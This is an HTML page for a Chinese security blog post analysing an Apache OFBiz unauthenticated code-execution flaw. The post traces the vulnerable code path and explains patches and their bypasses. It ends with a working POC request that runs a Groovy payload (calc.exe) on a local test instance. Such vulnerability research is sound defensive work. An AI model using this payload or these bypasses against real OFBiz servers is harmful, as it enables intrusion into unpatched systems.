@@ -1,0 +1,301 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <title>Apache OFBiz代码执行漏洞分析 | W000i</title>
+    <meta name="author" content="W00i" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>W000I</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;W000I</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Apache OFBiz代码执行漏洞分析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/9/17
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Java/" style="color: #ffa2c4">
+                    Java
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>Apache OFBiz是一款基于 Web 的开源企业资源规划和客户关系管理套件。该软件具有会计、目录和供应链管理、存储付款信息等功能。Apache OFBiz 被许多大型组织使用，之前披露的漏洞已被广泛利用。</p>
+<span id="more"></span>
+
+<p>2024 年，Apache OFBiz 发布了少量未经认证的代码执行 CVE。8 月，网络安全和基础设施安全局将<a target="_blank" rel="noopener" href="https://www.cisa.gov/news-events/alerts/2024/08/07/cisa-adds-two-known-exploited-vulnerabilities-catalog">其中一个 CVE-2024-32113 添加到其已知被利用漏洞目录中</a>，其实这三个漏洞(CVE-2024-32113 、CVE-2024-36104 、CVE-2024-38856)本质上是具有相同根源的相同漏洞。</p>
+<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a><strong>环境部署</strong></h2><p>修改xml配置文件参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38989540/article/details/106106001">https://blog.csdn.net/weixin_38989540/article/details/106106001</a></p>
+<p>进入\framework\entity\config\entityengine.xml</p>
+<p>选中的修改为localmysql</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps1.jpg" alt="img"> </p>
+<p>修改数据库连接密码</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps2.jpg" alt="img"> </p>
+<p>创建ofbiz库</p>
+<p>执行gradlew.bat loadAll命令导入数据库</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps3.jpg" alt="img"> </p>
+<p>现在表里都有字段了</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps4.jpg" alt="img"> </p>
+<p>idea打开项目</p>
+<p>终端执行以下命令：</p>
+<p>.&#x2F;gradlew ofbiz –debug-jvm</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps5.jpg" alt="img"> </p>
+<p>添加一个运行配置</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps6.jpg" alt="img"> </p>
+<p>点击Dbug</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps7.jpg" alt="img"> </p>
+<p>访问<a target="_blank" rel="noopener" href="https://127.0.0.1:8443/webtools/control/main">https://127.0.0.1:8443/webtools/control/main</a></p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps8.jpg" alt="img"> </p>
+<p>调试的时候host要设置127.0.0.1，不然会报错。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps9.jpg" alt="img"> </p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h2><p>请求url为：<a target="_blank" rel="noopener" href="https://127.0.0.1:8443/webtools/control/forgotPassword/ProgramExport">https://127.0.0.1:8443/webtools/control/forgotPassword/./ProgramExport</a></p>
+<p>ControlFilter#doFilter会对URL进行标准化处理，这里去掉了.&#x2F;</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps10.jpg" alt="img"> </p>
+<p>然后会走到RequestHandler#doRequest方法。</p>
+<p>从XML文件中读取控制器配置</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps11.jpg" alt="img"> </p>
+<p>跟进看下，解析WEB-INF&#x2F;controller.xml这个文件。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps12.jpg" alt="img"> </p>
+<p>最后控制器配置数据保存在ccfg</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps13.jpg" alt="img"> </p>
+<p>再往后就是初始化变量path、requestUri和overrideViewURI的值。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps14.jpg" alt="img"> </p>
+<p>getRequestUri方法获取requestUri，通过&#x2F;分割，返回第0个元素。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps15.jpg" alt="img"> </p>
+<p>getOverrideViewUri方法获取，通过&#x2F;分割，干掉了第0个元素，然后返回。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps16.jpg" alt="img"> </p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps17.jpg" alt="img"> </p>
+<p>requestUri和overrideViewUri的最终计算值为requestUri&#x3D;forgotPassword和overrideViewUri&#x3D;ProgramExport</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps18.jpg" alt="img"> </p>
+<p>跟进下面的Collection<RequestMap> rmaps &#x3D; resolveURI(ccfg, request);</p>
+<p>大概是从控制器读取requestUri传递的配置信息。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps19.jpg" alt="img"> </p>
+<p>对应的配置信息如下，其中关键的是auth为false，</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps20.jpg" alt="img"> </p>
+<p>返回后继续往下跟</p>
+<p>requestMap.securityAuth的结果为false，代表不会进入安全检查。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps21.jpg" alt="img"> </p>
+<p>type为view，进入if分支。</p>
+<p>viewName的值为ProgramExport，这是路径的第二部分，而刚才进行检查的是第一部分。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps22.jpg" alt="img"> </p>
+<p>跟进renderView()方法</p>
+<p>获取http请求传递的参数，</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps23.jpg" alt="img"> </p>
+<p>往下看，获取ProgramExport视图相关的配置信息</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps24.jpg" alt="img"> </p>
+<p>跟进发现获取\framework\webtools\webapp\webtools\WEB-INF\controller.xml</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps25.jpg" alt="img"> </p>
+<p>视图信息为component:&#x2F;&#x2F;webtools&#x2F;widget&#x2F;EntityScreens.xml#ProgramExport</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps26.jpg" alt="img"> </p>
+<p>获取视图信息保存在nextPage</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps27.jpg" alt="img"> </p>
+<p>渲染视图</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps28.jpg" alt="img"> </p>
+<p>后面的调用栈如下：</p>
+<p>executeScript:342, ScriptUtil (org.apache.ofbiz.base.util)</p>
+<p>executeScript:324, ScriptUtil (org.apache.ofbiz.base.util)</p>
+<p>runAction:634, AbstractModelAction$Script (org.apache.ofbiz.widget.model)</p>
+<p>runSubActions:143, AbstractModelAction (org.apache.ofbiz.widget.model)</p>
+<p>renderWidgetString:278, ModelScreenWidget$Section (org.apache.ofbiz.widget.model)</p>
+<p>renderScreenString:164, ModelScreen (org.apache.ofbiz.widget.model)</p>
+<p>render:140, ScreenRenderer (org.apache.ofbiz.widget.renderer)</p>
+<p>render:102, ScreenRenderer (org.apache.ofbiz.widget.renderer)</p>
+<p>render:113, MacroScreenViewHandler (org.apache.ofbiz.widget.renderer.macro)</p>
+<p>最后跟到ScriptUtil#executeScript(java.lang.String, java.lang.String, java.util.Map&lt;java.lang.String,java.lang.Object&gt;, java.lang.Object[])</p>
+<p>当前后缀为.groovy，进入if调用GroovyUtil.runScriptAtLocation(filePath, functionName, context);</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps29.jpg" alt="img"> </p>
+<p>跟进GroovyUtil.runScriptAtLocation方法</p>
+<p>创建一个脚本对象并获取脚本，如果methodName为空，调用script.run()，这样会运行整个脚本文件。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps30.jpg" alt="img"> </p>
+<p>跟进script.run()进入到ProgramExport.groovy</p>
+<p>获取参数</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps31.jpg" alt="img"> </p>
+<p>shell.evaluate(groovyProgram)执行后成功弹出计算器</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps32.jpg" alt="img"> </p>
+<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a><strong>补丁分析</strong></h2><p>18.12.13</p>
+<p>补丁：比较原始URL和标准化后的URL是否一致，如果不一致则拒绝该请求。</p>
+<p>绕过：通过使用;代替.&#x2F;绕过限制。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps33.jpg" alt="img"> </p>
+<p>18.12.14</p>
+<p>补丁：从URI中删除;和URL编码的;</p>
+<p>绕过：不需要遍历或分号序列，对类似路径的请求&#x2F;webtools&#x2F;control&#x2F;forgotPassword&#x2F;ProgramExport会导致控制器设置为“forgotPassword”，视图映射设置为“ProgramExport”</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps34.jpg" alt="img"> </p>
+<p>18.12.15</p>
+<p>为ProgramExport和EntitySQLProcessor 添加权限检查，因此，这两种漏洞利用技术都不再可行。</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps35.jpg" alt="img"> </p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps36.jpg" alt="img"> </p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>这个POC适用于CVE-2024-32113 、CVE-2024-36104 、CVE-2024-38856</p>
+<p>POST &#x2F;webtools&#x2F;control&#x2F;forgotPassword&#x2F;ProgramExport HTTP&#x2F;1.1</p>
+<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>Host: 127.0.0.1:8443</p>
+<p>Content-Length: 61</p>
+<p>groovyProgram&#x3D;throw+new+Exception(‘calc.exe’.execute().text);</p>
+<p><img src="/../imgs/Apache%20OFBiz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wps37.jpg" alt="img"> </p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/">https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/</a></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 W000i
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;W00i
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+	
+	
+	{% if theme.fireworks %}
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
+    {% endif %}
+ 
+</body>
+</html>
